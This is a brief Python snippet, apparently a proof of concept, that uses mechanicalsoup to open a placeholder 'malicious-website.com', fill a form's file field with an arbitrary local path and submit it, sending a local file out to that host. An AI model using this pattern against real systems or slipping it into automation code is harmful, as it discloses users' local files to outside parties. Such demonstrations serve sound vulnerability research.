import mechanicalsoup

# Create a browser object
browser = mechanicalsoup.StatefulBrowser()

# Navigate to a malicious website
browser.open("https://malicious-website.com")

# Submit a form with a file input field
browser.select_form('form')
browser.form.set("file", "/path/to/arbitrary/file")
browser.submit_selected()